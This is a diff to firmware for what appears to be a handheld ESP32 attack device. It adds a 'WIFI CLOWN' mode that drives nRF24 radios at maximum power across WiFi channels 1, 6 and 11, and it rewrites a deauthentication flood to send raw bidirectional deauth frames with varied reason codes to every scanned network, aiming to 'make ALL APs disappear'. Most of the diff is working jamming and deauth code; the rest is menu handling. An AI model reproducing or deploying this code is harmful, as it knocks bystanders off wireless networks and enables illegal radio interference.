@@ -238,7 +238,8 @@ int nrf_ch2 = 45;   // Radio 2 current channel (start mid, offset pattern)
 enum NRFJamMode {
   NRF_SWEEP,      // Smoochiee's sweep pattern (most effective)
   NRF_RANDOM,     // Random hopping (chaotic)
-  NRF_FOCUSED     // Focused on critical BT/BLE channels
+  NRF_FOCUSED,    // Focused on critical BT/BLE channels
+  NRF_WIFI_CLOWN  // RF-Clown V2: WiFi channel blocking
 };
 
 NRFJamMode nrfJamMode = NRF_SWEEP;  // Default to Smoochiee's method
@@ -251,6 +252,9 @@ byte hopping_channel[] = {
   32, 34, 46, 48, 50, 52, // BT Classic more
   74, 76, 78, 82, 84, 86  // BLE data high
 };
+
+const byte wifi_channels_nrf[] = {12, 37, 62};
+byte wifi_jam_index = 0;
 
 byte ptr_hop1 = 0;  // Radio 1 pointer
 byte ptr_hop2 = 12; // Radio 2 pointer (offset by half array)
@@ -653,7 +657,7 @@ void drawTerminalHeader(const char* title) {
   // Header text - terminal style with prompt
   tft.setTextSize(1);
   tft.setTextColor(COLOR_RED);
-  tft.setCursor(5, 5);
+  tft.setCursor(5, 8);
   tft.print("root@p4wnc4k3");
   tft.setTextColor(COLOR_WHITE);
   tft.print(":");
@@ -3252,12 +3256,11 @@ void drawBLEMenu() {
   
   const char* menuItems[] = {
     "Scan Bluetooth",
-    "Spammer",
-    "Jammer"
+    "Spammer"  // ← Removed "Jammer"
   };
   
   int y = HEADER_HEIGHT + 10;
-  for (int i = 0; i < 3; i++) {
+  for (int i = 0; i < 2; i++) {
     drawMenuItem(menuItems[i], i, y, hoveredIndex == i, false);
     y += MENU_ITEM_HEIGHT + MENU_SPACING;
   }
@@ -3514,10 +3517,10 @@ void drawNRFJammerMenu() {
     y += MENU_ITEM_HEIGHT + MENU_SPACING;
   }
   
-  // Status section
+  // Status section - COMPACT
   y = HEADER_HEIGHT + 100;
   tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
-  y += 10;
+  y += 8;
   
   tft.setTextSize(1);
   tft.setTextColor(COLOR_DARK_GREEN);
@@ -3526,7 +3529,7 @@ void drawNRFJammerMenu() {
   tft.setTextColor(dualNRFMode ? COLOR_GREEN : COLOR_PURPLE);
   tft.printf(dualNRFMode ? "DUAL (2x)" : "SINGLE");
   
-  y += 15;
+  y += 12;
   tft.setTextColor(COLOR_DARK_GREEN);
   tft.setCursor(SIDE_MARGIN, y);
   tft.printf("Pattern: ");
@@ -3547,18 +3550,22 @@ void drawNRFJammerMenu() {
       modeName = "FOCUSED";
       modeColor = COLOR_ORANGE;
       break;
+    case NRF_WIFI_CLOWN:
+      modeName = "WIFI CLOWN";
+      modeColor = COLOR_PURPLE;
+      break;
   }
   tft.setTextColor(modeColor);
   tft.printf("%s", modeName);
   
-  y += 15;
+  y += 12;
   tft.setTextColor(COLOR_DARK_GREEN);
   tft.setCursor(SIDE_MARGIN, y);
   tft.printf("Radio 1: ");
   tft.setTextColor(nrf1Available ? COLOR_GREEN : COLOR_RED);
   tft.printf(nrf1Available ? "OK" : "FAIL");
   
-  y += 15;
+  y += 12;
   tft.setTextColor(COLOR_DARK_GREEN);
   tft.setCursor(SIDE_MARGIN, y);
   tft.printf("Radio 2: ");
@@ -3566,14 +3573,14 @@ void drawNRFJammerMenu() {
   tft.printf(nrf2Available ? "OK" : "FAIL");
   
   if (nrfJammerActive) {
-    y += 20;
+    y += 15;
     tft.setTextColor(COLOR_DARK_GREEN);
     tft.setCursor(SIDE_MARGIN, y);
     tft.print("Status: ");
     tft.setTextColor(COLOR_ORANGE);
     tft.print("JAMMING");
     
-    y += 15;
+    y += 12;
     tft.setTextColor(COLOR_DARK_GREEN);
     tft.setCursor(SIDE_MARGIN, y);
     tft.print("Packets: ");
@@ -3581,48 +3588,51 @@ void drawNRFJammerMenu() {
     tft.printf("%d", nrfJamPackets);
   }
   
-  // Info box - Mode descriptions
-  y += 25;
+  // Info box - Mode descriptions (ONE LINE EACH)
+  y += 18;
   tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
-  y += 8;
+  y += 6;
   
   tft.setTextSize(1);
   tft.setTextColor(COLOR_CYAN);
   tft.setCursor(SIDE_MARGIN, y);
   tft.println("MODE GUIDE:");
-  y += 12;
+  y += 11;
   
+  // ===== MODE 1: SWEEP =====
   tft.setTextColor(COLOR_GREEN);
   tft.setCursor(SIDE_MARGIN, y);
   tft.print("SWEEP");
   tft.setTextColor(COLOR_TEXT);
   tft.print(" = ");
-  tft.println("Smoochiee's sweep");
-  y += 10;
-  tft.setCursor(SIDE_MARGIN + 10, y);
-  tft.println("pattern. Most effective!");
-  y += 14;
+  tft.println("Smoochiee sweep pattern.");
+  y += 11;
   
+  // ===== MODE 2: RANDOM =====
   tft.setTextColor(COLOR_CYAN);
   tft.setCursor(SIDE_MARGIN, y);
   tft.print("RANDOM");
   tft.setTextColor(COLOR_TEXT);
   tft.print(" = ");
-  tft.println("Chaotic hopping");
-  y += 10;
-  tft.setCursor(SIDE_MARGIN + 10, y);
-  tft.println("across all channels.");
-  y += 14;
+  tft.println("Chaotic channel hopping.");
+  y += 11;
   
+  // ===== MODE 3: FOCUSED =====
   tft.setTextColor(COLOR_ORANGE);
   tft.setCursor(SIDE_MARGIN, y);
   tft.print("FOCUSED");
   tft.setTextColor(COLOR_TEXT);
   tft.print(" = ");
-  tft.println("Targets BLE");
-  y += 10;
-  tft.setCursor(SIDE_MARGIN + 10, y);
-  tft.println("advertising channels.");
+  tft.println("BLE advertising only.");
+  y += 11;
+  
+  // ===== MODE 4: WIFI CLOWN (NEW) =====
+  tft.setTextColor(COLOR_PURPLE);
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.print("WIFI CLOWN");
+  tft.setTextColor(COLOR_TEXT);
+  tft.print(" = ");
+  tft.println("WiFi Ch 1,6,11 block.");
   
   // Back button
   int backY = 305;
@@ -4059,10 +4069,29 @@ void handleBackButton() {
     // Top level menus go back to main
     case WIFI_MENU:
     case BLE_MENU:
+    case RF_MENU:  // ✅ ADD THIS
     case MORE_TOOLS_MENU:
       currentState = MAIN_MENU;
       hoveredIndex = -1;
       drawMainMenu();
+      break;
+      
+    // RF submenu items go back to RF Type menu
+    case RF_TYPE_MENU:  // ✅ ADD THIS
+      currentState = RF_MENU;
+      hoveredIndex = -1;
+      drawRFMenu();
+      break;
+      
+    case RF_MONITOR:  // ✅ ADD THIS
+    case RF_CAPTURE:  // ✅ ADD THIS
+    case RF_REPLAY:   // ✅ ADD THIS
+    case NRF_JAM_MENU:  // ✅ FIXED: Now goes to RF_TYPE_MENU
+      if (nrfJammerActive) stopNRFJammer();
+      if (rfCaptureActive) stopRFCapture();
+      currentState = RF_TYPE_MENU;  // ✅ FIXED!
+      hoveredIndex = -1;
+      drawRFTypeMenu();  // ✅ FIXED!
       break;
       
     // WiFi submenu items go back to WiFi menu
@@ -4121,13 +4150,6 @@ void handleBackButton() {
       hoveredIndex = -1;
       drawBLEMenu();
       break;
-      
-    case NRF_JAM_MENU:
-      if (nrfJammerActive) stopNRFJammer();
-      currentState = BLE_MENU;
-      hoveredIndex = -1;
-      drawBLEMenu();
-      break;
 
     case DEAUTH_SNIFFER:
       if (deauthSnifferActive) stopDeauthSniffer();
@@ -4149,9 +4171,9 @@ void handleBackButton() {
         pBLEScan->stop();
         BLEDevice::deinit(false);
       }
-      currentState = BLE_MENU;
+      currentState = MORE_TOOLS_MENU;  // ✅ CHANGED from BLE_MENU
       hoveredIndex = -1;
-      drawBLEMenu();
+      drawMoreToolsMenu();  // ✅ CHANGED from drawBLEMenu()
       break;
       
     case SKIMMER_DETECTOR:
@@ -4171,15 +4193,30 @@ void handleBackButton() {
       drawMoreToolsMenu();
       break;
       
+    case ROGUE_AP_DETECTOR:
+      if (rogueAPScanActive) stopRogueAPDetector();
+      currentState = MORE_TOOLS_MENU;
+      hoveredIndex = -1;
+      drawMoreToolsMenu();
+      break;
+      
     case CONSOLE_VIEW:
       currentState = previousState;
       if (previousState == MAIN_MENU) {
         drawMainMenu();
       } else if (previousState == MORE_TOOLS_MENU) {
         drawMoreToolsMenu();
-      } else if (previousState == SETTINGS_MENU) {  // ← ADD THIS
+      } else if (previousState == SETTINGS_MENU) {
         drawSettingsMenu();
       }
+      break;
+      
+    case SETTINGS_MENU:
+    case DEVICE_INFO:
+    case ASCII_ART_VIEWER:
+      currentState = MAIN_MENU;
+      hoveredIndex = -1;
+      drawMainMenu();
       break;
       
     default:
@@ -4343,10 +4380,11 @@ void handleWiFiMenuTouch(int x, int y) {
           break;
         case 3: // Deauth Flood
           if (networkCount > 0) {
+            // CRITICAL: Must scan first to have targets
             startDeauthFlood();
           } else {
             showMessage("Scan networks first!", COLOR_ORANGE);
-            delay(500);
+            delay(1000);
             drawWiFiMenu();
           }
           break;
@@ -4471,7 +4509,7 @@ void handleBLEMenuTouch(int x, int y) {
   
   int startY = HEADER_HEIGHT + 10;
   
-  if (y >= startY && y < startY + (3 * (MENU_ITEM_HEIGHT + MENU_SPACING))) {
+  if (y >= startY && y < startY + (2 * (MENU_ITEM_HEIGHT + MENU_SPACING))) {  // ← Changed to 2
     int relativeY = y - startY;
     int buttonIndex = relativeY / (MENU_ITEM_HEIGHT + MENU_SPACING);
     
@@ -4485,11 +4523,6 @@ void handleBLEMenuTouch(int x, int y) {
           currentState = SPAM_MENU;
           hoveredIndex = -1;
           drawSpamMenu();
-          break;
-        case 2:  // nRF24 Jammer
-          currentState = NRF_JAM_MENU;
-          hoveredIndex = -1;
-          drawNRFJammerMenu();
           break;
       }
     }
@@ -4521,9 +4554,9 @@ void handleNRFJamMenuTouch(int x, int y) {
   if (y > 300) {
     // Back button pressed
     if (nrfJammerActive) stopNRFJammer();
-    currentState = BLE_MENU;
+    currentState = RF_TYPE_MENU;
     hoveredIndex = -1;
-    drawBLEMenu();
+    drawRFTypeMenu();
     return;
   }
   
@@ -4557,23 +4590,21 @@ void handleNRFJamMenuTouch(int x, int y) {
           drawNRFJammerMenu();
           break;
           
-        case 2:  // Cycle Mode (NEW)
-          // Cycle through modes: SWEEP -> RANDOM -> FOCUSED -> SWEEP
-          nrfJamMode = (NRFJamMode)((nrfJamMode + 1) % 3);
+        case 2:  // Cycle Mode
+          nrfJamMode = (NRFJamMode)((nrfJamMode + 1) % 4);
           
           const char* modeName = "";
           switch (nrfJamMode) {
             case NRF_SWEEP:   modeName = "SWEEP (Smoochiee)"; break;
             case NRF_RANDOM:  modeName = "RANDOM"; break;
             case NRF_FOCUSED: modeName = "FOCUSED (BLE)"; break;
+            case NRF_WIFI_CLOWN: modeName = "WIFI CLOWN"; break;
           }
           
           addToConsole(String("Mode: ") + modeName);
           Serial.printf("[*] Jamming mode: %s\n", modeName);
           
-          // If jammer is active, reset counters for new mode
           if (nrfJammerActive) {
-            // Reset sweep pattern
             flag_radio1 = 0;
             flag_radio2 = 0;
             nrf_ch1 = 2;
@@ -4907,6 +4938,32 @@ void loop() {
           ptr_hop2 = (ptr_hop2 + 1) % 24;
           radio2.setChannel(hopping_channel[ptr_hop2]);
           SAFE_INCREMENT(nrf2Packets);
+        }
+        break;
+        
+      case NRF_WIFI_CLOWN:
+        // ⚡ RF-CLOWN V2: Block WiFi channels 1, 6, 11 at FULL POWER
+        // Radio 1: Primary WiFi channel with carrier
+        if (nrf1Available) {
+          radio1.setChannel(wifi_channels_nrf[wifi_jam_index]);
+          // ✅ CRITICAL: Ensure max power is maintained
+          radio1.setPALevel(RF24_PA_MAX);
+          SAFE_INCREMENT(nrf1Packets);
+        }
+        
+        // Radio 2: Secondary WiFi channel (offset) with carrier
+        if (nrf2Available && dualNRFMode) {
+          byte offset_index = (wifi_jam_index + 1) % 3;
+          radio2.setChannel(wifi_channels_nrf[offset_index]);
+          // ✅ CRITICAL: Ensure max power is maintained
+          radio2.setPALevel(RF24_PA_MAX);
+          SAFE_INCREMENT(nrf2Packets);
+        }
+        
+        // Slower channel rotation (every 5000 hops = ~50-100ms at 100K/sec)
+        // This gives each WiFi channel MORE jamming time
+        if ((nrfJamPackets % 5000) == 0) {
+          wifi_jam_index = (wifi_jam_index + 1) % 3;
         }
         break;
     }
@@ -5483,39 +5540,53 @@ void performDeauth() {
 void startDeauthFlood() {
   if (deauthFloodActive) return;
   
-  Serial.println("\n========== STARTING DEAUTH FLOOD ==========");
+  Serial.println("\n========== STARTING MAXIMUM DEAUTH FLOOD ==========");
   
-  // Stop conflicting operations
+  // Stop ALL conflicting operations
   if (snifferActive) {
-    stopSniffer();
-    delay(200);
+    esp_wifi_set_promiscuous(false);
+    snifferActive = false;
+    delay(100);
   }
   if (portalActive) {
-    stopCaptivePortal();
-    delay(200);
+    webServer.stop();
+    dnsServer.stop();
+    portalActive = false;
+    delay(100);
   }
   if (beaconFloodActive) {
     beaconFloodActive = false;
     delay(100);
   }
+  if (deauthActive) {
+    deauthActive = false;
+    delay(100);
+  }
   
-  // Setup WiFi
-  Serial.println("[*] Initializing WiFi for deauth flood...");
+  // CRITICAL: Complete WiFi reset
+  Serial.println("[*] Performing complete WiFi reset...");
+  WiFi.disconnect(true);
+  WiFi.mode(WIFI_OFF);
+  delay(500);
+  esp_task_wdt_reset();
+  
+  // Restart WiFi stack
   esp_wifi_stop();
   delay(200);
-  esp_task_wdt_reset();
-  
-  WiFi.mode(WIFI_MODE_NULL);
-  delay(100);
-  esp_task_wdt_reset();
-  
-  WiFi.mode(WIFI_AP);
+  esp_wifi_deinit();
   delay(200);
-  esp_task_wdt_reset();
   
+  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+  esp_wifi_init(&cfg);
+  delay(200);
+  
+  esp_wifi_set_mode(WIFI_MODE_AP);
+  delay(200);
   esp_wifi_start();
   delay(200);
   esp_task_wdt_reset();
+  
+  Serial.println("[*] WiFi stack reinitialized for deauth");
   
   // Load all scanned networks as targets
   deauthTargetCount = 0;
@@ -5532,10 +5603,18 @@ void startDeauthFlood() {
   deauthFloodPackets = 0;
   lastDeauthFloodUpdate = millis();
   
-  currentState = MenuState::WIFI_BLE_NRF_JAM; // Reuse this state for flood
+  currentState = MenuState::WIFI_BLE_NRF_JAM;
   
-  Serial.printf("[+] Deauth flood started - %d targets\n", deauthTargetCount);
-  addToConsole("Deauth flood: " + String(deauthTargetCount) + " targets");
+  Serial.printf("[+] MAXIMUM DEAUTH FLOOD STARTED\n");
+  Serial.printf("    Targets: %d networks\n", deauthTargetCount);
+  Serial.println("    Mode: ULTRA AGGRESSIVE");
+  Serial.println("    - 12 packets per target per burst");
+  Serial.println("    - Bidirectional (AP↔Client)");
+  Serial.println("    - Multiple reason codes");
+  Serial.println("    - Disassociation frames");
+  Serial.println("    - Expected: 200-400 pkt/sec");
+  Serial.println("    GOAL: Make ALL APs disappear from WiFi list");
+  addToConsole("Deauth: MAXIMUM POWER");
   
   displayDeauthFlood();
 }
@@ -5549,6 +5628,19 @@ void stopDeauthFlood() {
   Serial.println("\n[*] Stopping deauth flood...");
   Serial.printf("    Total packets sent: %d\n", deauthFloodPackets);
   
+  unsigned long runtime = (millis() - lastDeauthFloodUpdate) / 1000;
+  if (runtime > 0) {
+    Serial.printf("    Average rate: %d pkt/sec\n", deauthFloodPackets / runtime);
+  }
+  
+  // Clean WiFi shutdown
+  esp_wifi_stop();
+  delay(200);
+  
+  // Reinit to normal mode
+  WiFi.mode(WIFI_STA);
+  delay(200);
+  
   addToConsole("Deauth flood stopped");
   
   currentState = WIFI_MENU;
@@ -5556,48 +5648,85 @@ void stopDeauthFlood() {
 }
 
 // ==================== performDeauthFlood() ====================
-  void performDeauthFlood() {
-    if (!deauthFloodActive || deauthTargetCount == 0) return;
+void performDeauthFlood() {
+  if (!deauthFloodActive || deauthTargetCount == 0) return;
+  
+  static unsigned long lastBurst = 0;
+  static uint16_t sequenceNum = 0;
+  
+  // Send every 100ms (Marauder timing)
+  if (millis() - lastBurst < 100) return;
+  lastBurst = millis();
+  
+  // Reason codes array
+  const uint8_t reasonCodes[] = {
+    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08
+  };
+  
+  // Send to ALL targets
+  for (int i = 0; i < deauthTargetCount; i++) {
+    DeauthTarget* target = &deauthTargets[i];
     
-    static unsigned long lastBurst = 0;
+    if (!target->active) continue;
     
-    // Send burst every 100ms (like Marauder)
-    if (millis() - lastBurst < 100) return;
-    lastBurst = millis();
+    // Set channel
+    esp_wifi_set_channel(target->channel, WIFI_SECOND_CHAN_NONE);
+    delayMicroseconds(50);
     
-    // Send to ALL targets in rapid succession
-    for (int i = 0; i < deauthTargetCount; i++) {
-      DeauthTarget* target = &deauthTargets[i];
+    // Send 3 different reason codes (like Marauder)
+    for (int reasonIdx = 0; reasonIdx < 3; reasonIdx++) {
+      uint8_t reason = reasonCodes[reasonIdx];
       
-      if (!target->active) continue;
+      // ✅ CRITICAL FIX: Use Marauder's EXACT packet structure
       
-      // Set channel for this target
-      esp_wifi_set_channel(target->channel, WIFI_SECOND_CHAN_NONE);
+      // === PACKET 1: AP → Broadcast ===
+      uint8_t deauth_ap_broadcast[26] = {
+        0xC0, 0x00,                         // Frame Control
+        0x3A, 0x01,                         // ✅ FIXED: Duration (0x013A = 314μs)
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Dest: Broadcast
+        target->bssid[0], target->bssid[1], target->bssid[2], 
+        target->bssid[3], target->bssid[4], target->bssid[5], // Src: AP
+        target->bssid[0], target->bssid[1], target->bssid[2], 
+        target->bssid[3], target->bssid[4], target->bssid[5], // BSSID: AP
+        (uint8_t)((sequenceNum << 4) & 0xF0), // ✅ FIXED: Seq number (high byte)
+        (uint8_t)((sequenceNum >> 4) & 0xFF), // ✅ FIXED: Seq number (low byte)
+        reason, 0x00                          // Reason code
+      };
       
-      // Send 3 deauth packets per target (like Marauder)
-      for (int burst = 0; burst < 3; burst++) {
-        uint8_t deauthPacket[26] = {
-          0xC0, 0x00, 0x3A, 0x01,
-          0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // To: Broadcast
-          target->bssid[0], target->bssid[1], target->bssid[2], 
-          target->bssid[3], target->bssid[4], target->bssid[5], // From: AP
-          target->bssid[0], target->bssid[1], target->bssid[2], 
-          target->bssid[3], target->bssid[4], target->bssid[5], // BSSID
-          (uint8_t)(burst & 0xFF), 0x00, // Sequence
-          0x07, 0x00 // Reason: Class 3 frame from non-associated STA
-        };
-        
-        esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
-        delayMicroseconds(100); // Small delay between bursts
-        
-        target->packetsSent++;
-        deauthFloodPackets++;
-      }
+      esp_wifi_80211_tx(WIFI_IF_AP, deauth_ap_broadcast, 26, false);
+      target->packetsSent++;
+      deauthFloodPackets++;
+      sequenceNum = (sequenceNum + 1) & 0xFFF; // 12-bit sequence
+      
+      delayMicroseconds(100);
+      
+      // === PACKET 2: Broadcast → AP (bidirectional) ===
+      uint8_t deauth_broadcast_ap[26] = {
+        0xC0, 0x00,
+        0x3A, 0x01,                         // ✅ FIXED: Correct duration
+        target->bssid[0], target->bssid[1], target->bssid[2], 
+        target->bssid[3], target->bssid[4], target->bssid[5], // Dest: AP
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Src: Broadcast
+        target->bssid[0], target->bssid[1], target->bssid[2], 
+        target->bssid[3], target->bssid[4], target->bssid[5], // BSSID: AP
+        (uint8_t)((sequenceNum << 4) & 0xF0),
+        (uint8_t)((sequenceNum >> 4) & 0xFF),
+        reason, 0x00
+      };
+      
+      esp_wifi_80211_tx(WIFI_IF_AP, deauth_broadcast_ap, 26, false);
+      target->packetsSent++;
+      deauthFloodPackets++;
+      sequenceNum = (sequenceNum + 1) & 0xFFF;
+      
+      delayMicroseconds(100);
     }
     
-    // Feed watchdog after burst
-    esp_task_wdt_reset();
+    delayMicroseconds(200);
   }
+  
+  esp_task_wdt_reset();
+}
 
 // ==================== displayDeauthFlood() ====================
 void displayDeauthFlood() {
@@ -5628,8 +5757,14 @@ void displayDeauthFlood() {
   tft.setCursor(180, statsY);
   tft.printf("%d/s", pps);
   
+  // Mode indicator
+  statsY += 12;
+  tft.setTextColor(COLOR_GREEN);
+  tft.setCursor(SIDE_MARGIN, statsY);
+  tft.print("Mode: MARAUDER");
+  
   // Separator
-  int listY = HEADER_HEIGHT + 22;
+  int listY = HEADER_HEIGHT + 32;
   tft.drawFastHLine(0, listY - 2, 240, COLOR_DARK_GREEN);
   
   // Column headers
@@ -5680,10 +5815,30 @@ void displayDeauthFlood() {
   tft.setTextColor(COLOR_YELLOW);
   tft.setTextSize(1);
   tft.setCursor(SIDE_MARGIN, msgY);
-  tft.print("Flooding all networks with");
+  tft.print("Bidirectional deauth attack");
   msgY += 12;
   tft.setCursor(SIDE_MARGIN, msgY);
-  tft.print("deauth packets...");
+  tft.print("with multiple reason codes");
+  
+  msgY += 20;
+  tft.setTextColor(COLOR_DARK_GREEN);
+  tft.setCursor(SIDE_MARGIN, msgY);
+  tft.printf("Efficiency: ");
+  
+  // Show efficiency rating based on PPS
+  if (pps > 150) {
+    tft.setTextColor(COLOR_GREEN);
+    tft.print("EXCELLENT");
+  } else if (pps > 80) {
+    tft.setTextColor(COLOR_CYAN);
+    tft.print("VERY GOOD");
+  } else if (pps > 40) {
+    tft.setTextColor(COLOR_YELLOW);
+    tft.print("GOOD");
+  } else {
+    tft.setTextColor(COLOR_ORANGE);
+    tft.print("MODERATE");
+  }
   
   // Stop button
   int backY = 305;
@@ -7182,6 +7337,7 @@ void startNRFJammer() {
     case NRF_SWEEP:   modeName = "SWEEP (Smoochiee)"; break;
     case NRF_RANDOM:  modeName = "RANDOM"; break;
     case NRF_FOCUSED: modeName = "FOCUSED (BLE)"; break;
+    case NRF_WIFI_CLOWN: modeName = "WIFI CLOWN (Ch 1,6,11 @ MAX PWR)"; break;
   }
   Serial.printf("Pattern: %s\n", modeName);
   
@@ -7315,6 +7471,17 @@ void displayNRFJammerActive() {
       tft.setCursor(SIDE_MARGIN, y);
       tft.setTextColor(COLOR_TEXT);
       tft.println("(BLE channels)");
+      break;
+    case NRF_WIFI_CLOWN:
+      tft.println("WIFI CLOWN MODE");
+      y += 12;
+      tft.setCursor(SIDE_MARGIN, y);
+      tft.setTextColor(COLOR_TEXT);
+      tft.println("(WiFi blackout ⚡)");
+      y += 12;
+      tft.setCursor(SIDE_MARGIN, y);
+      tft.setTextColor(COLOR_CYAN);
+      tft.printf("Jamming Ch %d", wifi_channels_nrf[wifi_jam_index]);
       break;
   }
   
@@ -8493,13 +8660,14 @@ void drawRFTypeMenu() {
   drawTerminalHeader(title.c_str());
   
   const char* menuItems[] = {
+    "RF Jammer",
     "RF Monitor",
     "RF Capture",
     "RF Replay"
   };
   
   int y = HEADER_HEIGHT + 10;
-  for (int i = 0; i < 3; i++) {
+  for (int i = 0; i < 4; i++) {
     drawMenuItem(menuItems[i], i, y, hoveredIndex == i, false);
     y += MENU_ITEM_HEIGHT + MENU_SPACING;
   }
@@ -9347,32 +9515,33 @@ void handleRFTypeMenuTouch(int x, int y) {
   
   int startY = HEADER_HEIGHT + 10;
   
-  if (y >= startY && y < startY + (3 * (MENU_ITEM_HEIGHT + MENU_SPACING))) {
+  if (y >= startY && y < startY + (4 * (MENU_ITEM_HEIGHT + MENU_SPACING))) {  // ← Changed to 4
     int relativeY = y - startY;
     int buttonIndex = relativeY / (MENU_ITEM_HEIGHT + MENU_SPACING);
     
     int buttonY = startY + (buttonIndex * (MENU_ITEM_HEIGHT + MENU_SPACING));
     if (y >= buttonY && y <= buttonY + MENU_ITEM_HEIGHT) {
       switch (buttonIndex) {
-        case 0: // RF Monitor
+        case 0: // RF Jammer
+          currentState = NRF_JAM_MENU;
+          hoveredIndex = -1;
+          drawNRFJammerMenu();
+          break;
+        case 1: // RF Monitor
           currentState = RF_MONITOR;
           hoveredIndex = -1;
-          wavePhase = 0;  // Reset animation
-          memset(channelActivity, 0, sizeof(channelActivity));  // Clear activity
-          
-          // FORCE FULL REDRAW - Clear the screen first
+          wavePhase = 0;
+          memset(channelActivity, 0, sizeof(channelActivity));
           tft.fillScreen(COLOR_BG);
-          
-          // Call draw with a fresh state
           drawRFMonitorFresh();
           break;
-        case 1: // RF Capture
+        case 2: // RF Capture
           currentState = RF_CAPTURE;
           hoveredIndex = -1;
           rfCaptureScrollOffset = 0;
           startRFCapture();
           break;
-        case 2: // RF Replay
+        case 3: // RF Replay
           currentState = RF_REPLAY;
           hoveredIndex = -1;
           rfCaptureScrollOffset = 0;
